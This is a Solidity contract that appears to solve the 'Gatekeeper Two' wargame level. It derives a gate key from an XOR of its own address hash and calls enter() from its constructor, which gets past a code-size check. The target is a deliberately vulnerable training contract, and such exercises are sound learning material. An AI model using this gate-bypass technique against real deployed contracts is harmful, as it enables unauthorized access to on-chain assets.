// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract Level14 {
    GatekeeperTwo gatekeeperTwoContract;

    constructor(address gatekeeperTwoAddr) public {
        gatekeeperTwoContract = GatekeeperTwo(gatekeeperTwoAddr);
        uint64 lhs = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 rhs = uint64(0) - 1;
        bytes8 gateKey = bytes8(lhs ^ rhs);
        gatekeeperTwoContract.enter(gateKey);
    }
}
